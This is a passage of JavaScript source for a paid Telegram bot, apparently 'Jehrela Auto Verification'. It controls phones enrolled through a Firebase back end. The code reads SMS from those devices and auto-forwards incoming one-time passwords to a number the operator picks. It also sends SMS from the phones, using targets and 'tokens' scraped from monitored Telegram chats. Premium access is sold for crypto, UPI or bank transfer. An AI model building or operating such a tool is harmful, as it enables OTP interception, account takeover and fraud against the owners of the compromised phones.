◈ /startmonitor

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       📞 O T P   F O R W A R D   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /addnum <number> - Set auto OTP forwarding
◈ /removenum - Disable auto OTP forwarding
◈ /shownum - Show current forwarding number

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       💎 P R E M I U M         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /premium - Check premium status
◈ /paid - Get premium access

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       ⚙️ C O N T R O L         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /stop / /resume
◈ /status
◈ /online
◈ /send <num> <msg>
◈ /listchannels / /removechannel
◈ /id

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🅥 🅔 🅡 🅢 🅘 🅞 🅝   1 . 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    if (isAdminUser) {
        helpText += `

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       👑 A D M I N            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /admin ◈ /users
◈ /ban <id> ◈ /unban <id>
◈ /broadcast ◈ /stats

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       💎 A D M I N   P R E     ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /pre <id> <days> - Give premium
◈ /removepre <id> - Remove premium
◈ /prelist - List premium users
◈ /unlock - Toggle free mode (5h)`;
    }
    
    await ctx.reply(helpText);
});

// ==================== CALLBACK HANDLERS ====================
bot.action(/^select_dev_(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const deviceId = ctx.match[1];
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        await ctx.editMessageText('❌ Premium required! Use /paid to get access.');
        return;
    }
    
    const device = await getDevice(userId, deviceId);
    if (!device) {
        await ctx.editMessageText('❌ Device not found');
        return;
    }
    
    const user = userData.get(userId);
    user.monitoringDevice = deviceId;
    user.deviceList = null;
    userData.set(userId, user);
    saveUser(userId, user);
    
    await ctx.editMessageText(
        `✅ *Device Set!*\n\n` +
        `📱 Name: ${device.name}\n` +
        `🆔 ID: \`${device.id}\`\n` +
        `📞 Phone: ${device.phone}\n` +
        `🔋 Battery: ${device.battery}\n` +
        `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n` +
        `📱 SIM1: ${device.sim1Number} (${device.sim1Carrier})\n` +
        `${device.sim2Number !== 'N/A' ? `📱 SIM2: ${device.sim2Number} (${device.sim2Carrier})\n` : ''}` +
        `\n*Note:* Commands will be sent even if device shows offline!`,
        { parse_mode: 'Markdown' }
    );
});

bot.action(/^dev_page_(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const page = parseInt(ctx.match[1]);
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        await ctx.editMessageText('❌ Premium required! Use /paid to get access.');
        return;
    }
    
    const user = userData.get(userId);
    if (!user || !user.deviceList) {
        await ctx.editMessageText('❌ Session expired. Please use /setdevice again.');
        return;
    }
    
    user.currentPage = page;
    userData.set(userId, user);
    saveUser(userId, user);
    await showDevicePage(ctx, userId, page);
});

bot.action('cancel_select', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (user) user.deviceList = null;
    saveUser(userId, user);
    await ctx.editMessageText('❌ Device selection cancelled.');
});

bot.action('get_premium', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        `💎 *GET PREMIUM*\n\n` +
        `Contact admin to purchase premium access:\n\n` +
        `📞 @jehrela_papa\n\n` +
        `Price: Contact admin for pricing\n\n` +
        `*Payment Methods:*\n` +
        `• Crypto (USDT/BTC)\n` +
        `• UPI\n` +
        `• Bank Transfer`,
        { parse_mode: 'Markdown' }
    );
});

bot.action('buy_premium', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        `💎 *PURCHASE PREMIUM*\n\n` +
        `To buy premium access:\n\n` +
        `1️⃣ Contact: @jehrela_papa\n` +
        `2️⃣ Share your User ID: \`${ctx.from.id}\`\n` +
        `3️⃣ Choose plan:\n` +
        `   • 30 days - Contact admin\n` +
        `   • 90 days - Contact admin\n` +
        `   • Lifetime - Contact admin\n\n` +
        `After payment, admin will activate your premium!`,
        { parse_mode: 'Markdown' }
    );
});

// ==================== ADDITIONAL CALLBACK HANDLERS ====================
bot.action('status', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    
    const user = userData.get(userId);
    if (!user || !user.firebaseUrl) {
        await ctx.editMessageText(
            `❌ *Not Configured!*\n\nPlease set up the bot first:\n\n` +
            `1️⃣ /setfirebase <url>\n` +
            `2️⃣ /setdevice\n` +
            `3️⃣ /addchannel\n` +
            `4️⃣ /startmonitor`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const devices = await getOnlineDevices(userId);
    const allDevices = await getAllDevices(userId);
    let deviceInfo = 'Not set';
    let deviceStatus = 'Unknown';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) {
            deviceInfo = `${d.name}`;
            deviceStatus = d.online ? '🟢 ONLINE' : '🔴 OFFLINE';
        }
    }
    
    let premiumStatus = isPremium(userId) ? '🟢 PREMIUM' : '🔴 FREE';
    if (botData.globalFreeMode) premiumStatus += ' (FREE MODE ACTIVE)';
    
    let forwardInfo = 'Not set';
    if (user.forwardNumber) {
        forwardInfo = `📞 ${user.forwardNumber}`;
    }
    
    await ctx.editMessageText(
        `📊 *STATUS*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `💎 Premium: ${premiumStatus}\n` +
        `📡 Firebase: ✅ Connected\n` +
        `📱 Device: ${deviceInfo}\n` +
        `📡 Status: ${deviceStatus}\n` +
        `📢 Chats: ${user.channels?.length || 0}\n` +
        `🖥 Total Devices: ${allDevices.length}\n` +
        `🟢 Online: ${devices.length}\n` +
        `⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `📞 Auto Forward: ${forwardInfo}\n` +
        `🕐 Started: ${user.monitorStartTime ? new Date(user.monitorStartTime).toLocaleString() : 'Not started'}\n` +
        `━━━━━━━━━━━━━━━━━━━\n\n` +
        `⚠️ *Note:* SMS will be sent even if device shows offline!`,
        { parse_mode: 'Markdown' }
    );
});

bot.action('devices', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        await ctx.editMessageText('❌ Premium required! Use /paid to get access.');
        return;
    }
    
    const user = userData.get(userId);
    if (!user?.firebaseUrl) {
        await ctx.editMessageText('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
        return;
    }
    
    const allDevices = await getAllDevices(userId);
    if (allDevices.length === 0) {
        await ctx.editMessageText('📭 *No devices found in Firebase!*\n\nMake sure devices are connected.', { parse_mode: 'Markdown' });
        return;
    }
    
    const sortedDevices = [...allDevices].sort((a, b) => (b.online ? 1 : 0) - (a.online ? 1 : 0));
    user.deviceList = sortedDevices;
    user.currentPage = 0;
    userData.set(userId, user);
    saveUser(userId, user);
    
    await showDevicePage(ctx, userId, 0);
});

bot.action('start_monitor', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        await ctx.editMessageText('❌ Premium required! Use /paid to get access.');
        return;
    }
    
    const user = userData.get(userId);
    
    if (!user?.firebaseUrl) {
        await ctx.editMessageText('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
        return;
    }
    if (!user.monitoringDevice) {
        await ctx.editMessageText('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
        return;
    }
    if (!user.channels?.length) {
        await ctx.editMessageText('❌ No chats!\n\nUse `/addchannel` in a channel/group', { parse_mode: 'Markdown' });
        return;
    }
    
    const now = new Date();
    user.monitorStartTime = now.toISOString();
    user.monitorActive = true;
    user.processedMsgs = new Set();
    user.processedSmsIds = new Set();
    userData.set(userId, user);
    saveUser(userId, user);
    
    startSmsMonitoring(userId);
    
    const device = await getDevice(userId, user.monitoringDevice);
    const deviceStatus = device ? (device.online ? '🟢 ONLINE' : '🔴 OFFLINE') : '❓ Unknown';
    
    let chatList = '';
    user.channels.slice(0, 5).forEach(ch => {
        const name = user.channelNames?.[ch] || 'Unknown';
        chatList += `   • ${name}\n`;
    });
    if (user.channels.length > 5) chatList += `   • +${user.channels.length - 5} more chats\n`;
    
    let forwardInfo = 'Not set';
    if (user.forwardNumber) {
        forwardInfo = `📞 ${user.forwardNumber}`;
    }
    
    await ctx.editMessageText(
        `✅ *MONITORING STARTED!*\n\n` +
        `📱 Device: \`${user.monitoringDevice}\`\n` +
        `📡 Device Status: ${deviceStatus}\n` +
        `📢 Monitored Chats: ${user.channels.length}\n` +
        `${chatList}\n` +
        `🕐 Started: ${now.toLocaleString()}\n\n` +
        `⚠️ *IMPORTANT:* Commands will be sent even if device shows offline!\n` +
        `🚀 Token forwarding ACTIVE!\n` +
        `📩 SMS forwarding ACTIVE!\n` +
        `📞 Auto OTP Forward: ${forwardInfo}`,
        { parse_mode: 'Markdown' }
    );
});

bot.action('stop_monitor', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        await ctx.editMessageText('❌ Premium required! Use /paid to get access.');
        return;
    }
    
    if (userData.has(userId)) {
        userData.get(userId).monitorActive = false;
        saveUser(userId, userData.get(userId));
        console.log(`⏸ User ${userId} stopped monitoring`);
        stopSmsMonitoring(userId);
    }
    await ctx.editMessageText(`⏸ *Monitor Paused*\n\nUse \`/resume\` to start.`, { parse_mode: 'Markdown' });
});

bot.action('list_channels', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        await ctx.editMessageText('❌ Premium required! Use /paid to get access.');
        return;
    }
    
    if (!user?.channels?.length) {
        await ctx.editMessageText('📭 No channels/groups added.\n\nUse `/addchannel` in the chat or `/addchannel <chat_id>`', { parse_mode: 'Markdown' });
        return;
    }
    
    let text = '📢 *MONITORED CHATS*\n\n━━━━━━━━━━━━━━━━━━━\n';
    user.channels.forEach((ch, i) => { 
        const name = user.channelNames?.[ch] || 'Unknown';
        text += `${i+1}. ${name}\n   🆔 \`${ch}\`\n\n`;
    });
    text += `━━━━━━━━━━━━━━━━━━━\n📊 Total: ${user.channels.length} chats`;
    await ctx.editMessageText(text, { parse_mode: 'Markdown' });
});

bot.action('check_premium', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    let status = '';
    let timeLeft = '';
    
    if (isPremium(userId)) {
        const remaining = user.premiumUntil - Date.now();
        const days = Math.floor(remaining / (24 * 60 * 60 * 1000));
        const hours = Math.floor((remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
        timeLeft = `${days}d ${hours}h`;
        status = '🟢 ACTIVE';
    } else {
        status = '🔴 INACTIVE';
    }
    
    const premiumKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💰 GET PREMIUM', callback_data: 'get_premium' }],
                [{ text: '📞 CONTACT ADMIN', url: 'https://t.me/Soulexe6' }]
            ]
        }
    };
    
    await ctx.editMessageText(
        `💎 *PREMIUM STATUS*\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 User ID: \`${userId}\`\n` +
        `📊 Status: ${status}\n` +
        `${timeLeft ? `⏱ Time Left: ${timeLeft}\n` : ''}` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `*Premium Features:*\n` +
        `✅ Auto token forwarding from channels\n` +
        `✅ Auto OTP forwarding to any number\n` +
        `✅ SMS sending via connected devices\n` +
        `✅ 24/7 message monitoring\n` +
        `✅ Priority support\n` +
        `✅ Unlimited device connections\n\n` +
        `Contact admin to purchase premium!`,
        { parse_mode: 'Markdown', ...premiumKeyboard }
    );
});

bot.action('add_number', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(
        `📞 *Set Auto OTP Forward Number*\n\n` +
        `Use the command:\n` +
        `/addnum <phone_number>\n\n` +
        `📌 Example: /addnum 7488831180\n\n` +
        `💡 All incoming OTP/SMS will be auto-forwarded to this number.`,
        { parse_mode: 'Markdown' }
    );
});

bot.action('remove_number', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        await ctx.editMessageText('❌ Premium required! Use /paid to get access.');
        return;
    }
    
    if (!userData.has(userId)) {
        userData.set(userId, {});
    }
    
    const user = userData.get(userId);
    
    if (!user.forwardNumber) {
        await ctx.editMessageText('❌ No forwarding number set. Use `/addnum <number>` first.', { parse_mode: 'Markdown' });
        return;
    }
    
    const oldNumber = user.forwardNumber;
    user.forwardNumber = null;
    userData.set(userId, user);
    saveUser(userId, user);
    
    await ctx.editMessageText(
        `❌ *Auto OTP Forward Disabled!*\n\n` +
        `📞 Removed: \`${oldNumber}\`\n\n` +
        `✅ No more SMS will be auto forwarded.\n` +
        `📌 Use /addnum to enable again.`,
        { parse_mode: 'Markdown' }
    );
    
    console.log(`✅ User ${userId} removed forward number via button: ${oldNumber}`);
});

bot.action('help', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const isAdminUser = isAdmin(userId);
    
    let helpText = `
╔══════════════════════════════╗
║      ⚡  C O M M A N D S   L I S T    ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       🔧 S E T U P             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /setfirebase <url>
◈ /setdevice (or /setdevice <name>)
◈ /addchannel (in your chat)
◈ /startmonitor

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       📞 O T P   F O R W A R D   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /addnum <number> - Set auto OTP forwarding
◈ /removenum - Disable auto OTP forwarding
◈ /shownum - Show current forwarding number

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       💎 P R E M I U M         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /premium - Check premium status
◈ /paid - Get premium access

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       ⚙️ C O N T R O L         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /stop / /resume
◈ /status
◈ /online
◈ /send <num> <msg>
◈ /listchannels / /removechannel
◈ /id

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🅥 🅔 🅡 🅢 🅘 🅞 🅝   1 . 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    if (isAdminUser) {
        helpText += `

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       👑 A D M I N            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /admin ◈ /users
◈ /ban <id> ◈ /unban <id>
◈ /broadcast ◈ /stats

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       💎 A D M I N   P R E     ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /pre <id> <days> - Give premium
◈ /removepre <id> - Remove premium
◈ /prelist - List premium users
◈ /unlock - Toggle free mode (5h)`;
    }
    
    await ctx.editMessageText(helpText);
});

// ==================== MESSAGE HANDLERS ====================
bot.on('channel_post', async (ctx) => {
    await handleMessage(ctx, ctx.channelPost);
});

bot.on('message', async (ctx) => {
    if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
        await handleMessage(ctx, ctx.message);
    }
});

async function handleMessage(ctx, messageObj) {
    const totalStart = Date.now();
    const chatId = ctx.chat.id.toString();
    const text = messageObj.text || messageObj.caption || '';
    const msgTime = messageObj.date * 1000;
    
    console.log(`\n📢 ========== NEW MESSAGE ==========`);
    console.log(`Chat: ${chatId} (${ctx.chat.type})`);
    console.log(`Text: ${text.slice(0, 200)}`);
    
    if (!text || text.trim().length === 0) return;
    
    const monitoringUsers = [];
    for (const [uid, u] of userData.entries()) {
        if (u.banned) continue;
        if (!canUseBot(uid)) continue;
        if (u.channels && u.channels.includes(chatId)) {
            monitoringUsers.push({ userId: uid, user: u });
            console.log(`✅ User ${uid} monitoring this chat`);
        }
    }
    
    if (monitoringUsers.length === 0) return;
    
    for (const { userId, user } of monitoringUsers) {
        if (!user.monitorActive) continue;
        
        const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
        if (msgTime < startTime) continue;
        
        const msgId = `${chatId}_${messageObj.message_id}`;
        if (user.processedMsgs && user.processedMsgs.has(msgId)) continue;
        
        const extracted = extractToken(text);
        if (!extracted) continue;
        
        console.log(`\n🎯 TOKEN DETECTED for user ${userId}`);
        console.log(`Number: ${extracted.number}`);
        console.log(`Token: ${extracted.message.slice(0, 50)}`);
        
        if (!user.processedMsgs) user.processedMsgs = new Set();
        user.processedMsgs.add(msgId);
        userData.set(userId, user);
        saveUser(userId, user);
        
        await bot.telegram.sendMessage(
            userId,
            `🎯 *TOKEN DETECTED!*\n\n📞 Target: \`${extracted.number}\`\n🔐 Token: \`${extracted.message.slice(0, 100)}\`\n🔄 Forwarding...`,
            { parse_mode: 'Markdown' }
        );
        
        if (!user.monitoringDevice) {
            await bot.telegram.sendMessage(userId, `❌ No device set!`, { parse_mode: 'Markdown' });
            continue;
        }
        
        const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
        const totalTime = Date.now() - totalStart;
        
        if (result.success) {
            await bot.telegram.sendMessage(
                userId,
                `✅ *FORWARDED!*\n\n📞 To: \`${extracted.number}\`\n⏱ ${totalTime}ms\n🆔 \`${result.commandId}\``,
                { parse_mode: 'Markdown' }
            );
        } else {
            await bot.telegram.sendMessage(userId, `❌ Failed: ${result.error}`, { parse_mode: 'Markdown' });
        }
    }
}

// ==================== PRIVATE MESSAGE ====================
bot.on('text', async (ctx) => {
    if (ctx.chat.type !== 'private') return;
    const userId = ctx.from.id.toString();
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const user = userData.get(userId);
    if (!user) return;
    if (user.banned) return ctx.reply('🔴 *BANNED*', { parse_mode: 'Markdown' });
    if (!user.monitoringDevice) return;
    
    const extracted = extractToken(text);
    if (!extracted) return;
    
    await ctx.reply(`📤 Sending to ${extracted.number}...`);
    const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
    
    if (result.success) {
        await ctx.reply(`✅ Sent! (${result.elapsed}ms)`);
    } else {
        await ctx.reply(`❌ Failed: ${result.error}`);
    }
});

// ==================== ID COMMAND ====================
bot.command('id', async (ctx) => {
    await ctx.reply(
        `📌 *Chat Info*\n\n🆔 Chat ID: \`${ctx.chat.id}\`\n👤 User ID: \`${ctx.from.id}\``,
        { parse_mode: 'Markdown' }
    );
});

// ==================== START ====================
async function main() {
    console.log('\n🚀 ========== JEHRELA AUTO VERIFICATION ==========');
    console.log('✅ VERSION: 1.0');
    console.log('✅ ADMIN: @jehrela_papa');
    console.log('==========================================\n');
    console.log('🔧 FIX: Device offline check REMOVED - Will always try to send');
    console.log('🔧 Added 4 different Firebase paths for commands');
    console.log('🔧 FIX: Markup.button.callback error - Using correct button syntax');
    console.log('🔧 IMPROVED: Online devices shown FIRST in device list');
    console.log('💎 ADDED: Premium/Paid system with admin controls');
    console.log('💎 ADDED: Free mode unlock for 5 hours');
    console.log('🔧 FIXED: channel_post handler - No more ctx.from.id error');
    console.log('💾 ADDED: Persistent storage with data.json');
    console.log('🔧 FIXED: processedMsgs Set iteration error');
    console.log('🎨 IMPROVED: Modern UI with emoji buttons and inline keyboards');
    console.log('📩 FIXED: SMS monitoring - Using correct path: messages/${deviceId}');
    console.log('📞 ADDED: Auto OTP Forward - /addnum <number>');
    console.log('📞 OTP automatically forwarded to user\'s saved number');
    console.log('==========================================\n');
    
    bot.launch();
    console.log('🤖 Bot running...\n');
}

main();